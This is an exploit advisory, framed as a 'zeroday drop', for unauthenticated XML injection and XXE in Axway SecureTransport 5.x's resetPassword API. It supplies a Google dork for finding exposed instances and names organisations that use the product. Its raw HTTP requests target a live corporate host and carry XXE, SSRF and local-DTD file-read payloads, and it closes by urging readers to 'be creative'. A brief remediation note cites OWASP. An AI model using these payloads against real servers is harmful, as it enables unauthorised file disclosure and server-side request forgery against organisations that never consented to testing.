@@ -1,0 +1,208 @@
+# Title: Axway SecureTransport 5 - Unauthenticated XML Injection
+# Google Dork: intitle:"Axway SecureTransport" "Login"
+# Date: 2019-07-20
+# Author: Dominik Penner / zer0pwn of Underdog Security
+# Vendor Homepage: https://www.axway.com/en
+# Software Link: https://docs.axway.com/bundle/SecureTransport_54_AdministratorGuide_allOS_en_HTML5/page/Content/AdministratorsGuide/overview/overview.htm
+# Version: 5.x
+# CVE: N/A
+				                     _       _ 
+				  _______ _ __ ___  | | ___ | |
+				 |_  / _ \ '__/ _ \ | |/ _ \| |
+				  / /  __/ | | (_) || | (_) | |
+				 /___\___|_|  \___(_)_|\___/|_|
+				    	  https://zero.lol
+				 	      zero days 4 days
+
+
+				ATTENTION:
+
+				this is a friendly neighborhood zeroday drop
+				                               
+
+
+
+"Axway SecureTransport is a multi-protocol MFT gateway for securing, managing, and tracking file flows among people and applications inside your enterprise, and beyond your firewall to your user communities, the cloud and mobile devices. It is designed to handle everything — from high-volume automated high speed secure file transfers between systems, sites, lines of business and external partners, to user-driven communications and mobile, folder- and portal-based file sharing."
+
+Who uses this software?
+
+Well, to name a few... (just use the dork dude)
+- Government of California
+- Biometrics.mil
+- Fleetcor
+- Costco
+- Boeing
+- IRS
+
+
+Description:
+Axway SecureTransport versions 5.3 through 5.0 (and potentially others) are vulnerable to an unauthenticated blind XML injection (& XXE) vulnerability in the resetPassword functionality via the REST API. If executed properly, this vulnerablity can lead to local file disclosure, DOS or URI invocation attacks (e.g SSRF->RCE). It's worth noting that in version 5.4 the v1 API was deprecated... but not removed entirely. Meaning that you can still trigger this vulnerability on updated installations if they have the v1.0, v1.1, v1.2 or v1.3 in the /api/ directory.
+
+
+Reproduction:
+
+1. Breaking the parser.
+
+	HTTP Request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	</email>
+	```
+
+	HTTP Response:
+	```
+	{
+	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 2; The markup in the document preceding the root element must be well-formed.]"
+	}
+	```
+
+
+2. Verifying the vulnerability.
+
+	HTTP Request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+	<!DOCTYPE resetPassword [
+	<!ENTITY thisactuallyexists SYSTEM "file:///dev/null">
+	]>
+	<resetPassword><email>&thisactuallyexists;&thisdoesnt;</email></resetPassword>
+	```
+
+	HTTP Response:
+	```
+	{
+	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 48; The entity "thisdoesnt" was referenced, but not declared.]"
+	}
+	```
+
+	As you can see, the parser recognizes that "thisactuallyexists" was in fact declared. In the same error, we see that "thisdoesn't" was referenced, but not declared. This demonstrates that we can declare arbitrary entities.
+
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability
+
+
+3. External Entity Injection (XXE) (hardened)
+
+	NOTE: Because the server doesn't reflect the input anywhere, our only option is error-based XXE or out-of-band XXE. However, upon initial discovery, it appears as though most Axway SecureTransport installations have some type of firewall blocking all outgoing requests. This makes exploiting traditional XXE difficult. Judging by this, my only ideas on exploitation would be via blind SSRF or by repurposing an existing DTD on the filesystem to trigger an error with the file contents/result of our payload. However because I don't have a license, I can't effectively audit this software from a whitebox perspective, which makes mapping out internal attack surface difficult. The underlying vulnerability remains... but with restrictions.
+
+	HTTP Request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+	<!DOCTYPE resetPassword [
+	<!ENTITY ssrf SYSTEM "http://localhost/SOMETHING_I_WISH_I_KNEW_EXISTED?NEW_PASSWORD=1337" >
+	]>
+	<resetPassword><email>&ssrf;</email></resetPassword>
+	```
+
+	HTTP Response:
+	```
+	(empty)
+	```
+
+	Local DTD repurposing example request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+	<!DOCTYPE resetPassword [
+	    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+
+	    <!ENTITY % expr 'aaa)>
+	        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
+	        <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+	        &#x25;eval;
+	        &#x25;error;
+	        <!ELEMENT aa (bb'>
+
+	    %local_dtd;
+	]>
+	<resetPassword></resetPassword>
+
+	```
+
+
+4. More vulnerability-indicating errors:
+
+	HTTP Request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+	<!DOCTYPE resetPassword [
+	<!ENTITY ssrf SYSTEM a >
+	]>
+	<resetPassword><email>&ssrf;</email></resetPassword>
+	```
+
+	HTTP Response:
+	```
+	{
+	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 22; The system identifier must begin with either a single or double quote character.]"
+	}
+	```
+
+5. The original request
+
+	HTTP Request:
+	```
+	POST /api/v1.0/myself/resetPassword HTTP/1.1
+	Host: securefile.costco.com
+	Content-Type: application/xml
+	Referer: localhost
+
+	<resetPassword><email>email@email.com</email></resetPassword>
+	```
+
+	HTTP Response:
+	```
+	(empty)
+	```
+
+
+Conclusion:
+
+If a determined attacker were to get to know the Axway SecureTransport software, the chances of successfully chaining this bug are high. DTD repurposing is a relatively new technique, however in the near future we will be seeing a lot more of this attack vector due to XML parser restrictions/firewalled networks. I didn't feel comfortable doing further testing as I don't have a license, meaning I'm limited to testing against live targets. So for now, enjoy the 0day. Be creative.
+
+
+Remediation:
+
+In order to avoid this vulnerability, it's suggested to disable both doctype declaration and external general entities. You can find more information on that here: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java
+
+
+Notes:
+
+- Referer must be set.
+- Content type must be xml.
+- Successful request returns a HTTP/1.1 204 No Content
+- Any type of invalid XML throws an SAXParser exception.
+- If external entities were disabled... we should also recieve an exception.
+- Same with doctype declaration.
+- API endpoints can vary from /api/v1.0, /api/v1.1, /api/v1.2, /api/v1.3, /api/v1.4
+
+
+References:
+
+https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
+https://gist.github.com/marcwickenden/acd0b23953b52e7c1a1a90925862d8e2
+https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html
+https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation
